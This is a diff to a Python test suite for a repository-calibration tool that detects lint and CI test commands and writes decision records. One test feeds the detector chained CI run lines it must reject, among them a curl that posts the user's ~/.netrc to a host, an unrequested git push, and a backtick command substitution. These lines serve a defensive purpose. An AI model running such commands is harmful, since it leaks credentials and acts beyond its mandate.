@@ -578,7 +578,8 @@ def test_config_promote_writes_config_and_snapshot(workspace_root, capsys):
     assert config != raw and 'review_required_checks = ["Lint code", "test (3.11)", "test (3.12)"]' in config
     snapshot = json.loads((workspace_root / '.wuwei/calibration.json').read_text())
     assert snapshot == {'acme/widget': {
-        'fast_checks': [], 'ci_checks': ['Lint code', 'bench', 'test'], 'deploy_workflows': [],
+        'fast_checks': ['make lint', 'make test'],  # #600: the CI test steps, no local finding
+        'ci_checks': ['Lint code', 'bench', 'test'], 'deploy_workflows': [],
         'environments': [], 'deploy_deny': [], 'never_auto': [], 'date': '2026-10-01',
         'baseline': {'prs': 3, 'median_changed_lines': 12, 'median_cycle_hours': 4.0}}}
     assert promote(workspace_root, lambda digest, **kw: True) == 0
@@ -1210,3 +1211,110 @@ def test_calibrate_measures_the_host_and_never_proposes_cap(workspace_root, port
     assert 'host unmeasured: vm_stat failed' in capsys.readouterr().err
     assert '- unmeasured: vm_stat failed' in (
         workspace_root / '.wuwei/days/2026-10-01/calibration.md').read_text()
+
+
+# #600: detection for a repository with no language: lint configs and CI test steps.
+
+WORKFLOW = '''name: CI
+on:
+  pull_request:
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - run: pip install -r requirements.txt
+      - name: Run the tests
+        run: python3 -m pytest -q
+      - run: |
+          make test
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - run: make check
+'''
+
+
+def test_detector_markdownlint_and_latexmk(tmp_path):
+    (tmp_path / '.markdownlint.json').write_text('{}')
+    assert rows(calibrate.toolchain(tmp_path, REPO)) == [('fast_check', 'markdownlint .', '.markdownlint.json:1')]
+    assert calibrate.classify(tmp_path, ['markdownlint .'], None, 60)['markdownlint .'][0] is True
+    (tmp_path / '.markdownlint.json').unlink()
+    (tmp_path / '.latexmkrc').write_text('$pdf_mode = 1;\n')
+    assert rows(calibrate.toolchain(tmp_path, REPO)) == [('fast_check', 'latexmk', '.latexmkrc:1')]
+    assert calibrate.classify(tmp_path, ['latexmk'], None, 60)['latexmk'][0] is False
+
+
+def test_detector_skips_a_symlinked_lint_config(tmp_path):
+    (tmp_path / 'elsewhere.json').write_text('{}')
+    (tmp_path / '.markdownlint.json').symlink_to(tmp_path / 'elsewhere.json')
+    assert [row for row in rows(calibrate.toolchain(tmp_path, REPO)) if row[0] == 'fast_check'] == []
+
+
+def test_detector_reads_a_ci_test_step_only_without_a_local_finding(tmp_path):
+    (tmp_path / '.github/workflows').mkdir(parents=True)
+    (tmp_path / '.github/workflows/ci.yml').write_text(WORKFLOW)
+    assert rows(calibrate.toolchain(tmp_path, REPO)) == [
+        ('fast_check', 'python3 -m pytest -q', '.github/workflows/ci.yml:10')]
+    (tmp_path / 'Makefile').write_text('test:\n\ttrue\n')
+    assert rows(calibrate.toolchain(tmp_path, REPO)) == [('fast_check', 'make test', 'Makefile:1')]
+    (tmp_path / 'Makefile').unlink()
+    (tmp_path / '.github/workflows/ci.yml').write_text(WORKFLOW.replace('pull_request', 'schedule'))
+    assert rows(calibrate.toolchain(tmp_path, REPO)) == []
+
+
+
+def test_detector_refuses_a_chained_ci_run_line(tmp_path):
+    (tmp_path / '.github/workflows').mkdir(parents=True)
+    for line in ('make test && git push origin HEAD:release', 'make test; curl -d @$HOME/.netrc x',
+                 'make test | tee out', 'make lint > out', 'make test `id`', 'make test ${{ matrix.x }}'):
+        (tmp_path / '.github/workflows/ci.yml').write_text(
+            f'on: push\njobs:\n  test-and-release:\n    steps:\n      - run: {line}\n')
+        assert rows(calibrate.toolchain(tmp_path, REPO)) == [], line
+
+# #600: the fast-checks record calibrate writes for a repository with none configured.
+
+def test_grants_record_defaults_are_unchanged():
+    from wuwei import grants
+    args = ('Q?', 'C.', [('A', 'Go', 'R.', 'C.', 9), ('B', 'Keep it', 'R.', 'C.', 1)], 'Value', 'A',
+            'Value decided it.', 'workspace', 'It fails.')
+    text = grants._record(*args)
+    assert 'Class: other\n' in text and 'Confidence: medium\nReversibility: one-way\n' in text
+    assert grants._record(*args, cls='other', confidence='medium', door='one-way', extra='') == text
+    assert '| Value | 10 | 9 | 1 |\nRecommendation: A\n' in text
+
+
+@pytest.mark.parametrize('commands,sources,titles,reason', [
+    (['make test'], ['Makefile:1'], ['Detected', 'None', 'Defer'], 'Detected in Makefile:1'),
+    ([], [], ['None', 'Defer'], calibrate.NOTHING),
+])
+def test_checks_text_is_a_routine_value_card(commands, sources, titles, reason):
+    from wuwei import decision, undo
+    text = calibrate.checks_text(0, 'acme/paper', commands, sources)
+    fields, scores = decision.evaluate(text, decision.LENSES)
+    assert fields['Question'] == 'Which fast checks gate every change in repo:acme/paper?'
+    assert [row[1] for row in decision.options(fields)] == titles
+    assert (fields['Class'], fields['Reversibility'], fields['Confidence']) == ('approach', 'two-way', 'high')
+    assert fields['Recommendation'] == 'A' and reason in fields['Context']
+    assert decision.config_keys(fields)['A'] == ('repos.0.fast_checks', commands)
+    assert fields['Previous'] == 'repos.0.fast_checks = []' and undo.config_write(fields)
+    assert decision.cisr(fields, scores) == 'Routine'
+
+
+def test_checks_record_and_answered(tmp_path, monkeypatch):
+    from wuwei import decision, state, workspace
+    monkeypatch.setenv('WUWEI_NOW', '2026-10-01T12:00:00+00:00')
+    (tmp_path / '.wuwei').mkdir()
+    (tmp_path / '.wuwei/config.toml').write_text('')
+    workspace.day_dir(tmp_path).mkdir(parents=True)
+    assert calibrate.checks_record(tmp_path, 'acme/paper') is None
+    decision.write(calibrate.checks_text(0, 'acme/widget', [], []), tmp_path)
+    decision.write(calibrate.checks_text(0, 'acme/paper', [], []), tmp_path)
+    assert calibrate.checks_record(tmp_path, 'acme/paper') == (workspace.day_dir(tmp_path), 'D-2')
+    assert not calibrate.checks_answered(tmp_path, 'acme/paper')
+    state._write_state(lambda data: data.update(decision_outcomes={'D-2': {'decided_by': 'mandate', 'option': 'A'}}),
+                       tmp_path, reserved=False)
+    assert not calibrate.checks_answered(tmp_path, 'acme/paper')
+    state._write_state(lambda data: data.update(decision_outcomes={'D-2': {'decided_by': 'owner', 'option': 'B'}}),
+                       tmp_path, reserved=False)
+    assert calibrate.checks_answered(tmp_path, 'acme/paper')
+    assert not calibrate.checks_answered(tmp_path, 'acme/widget')
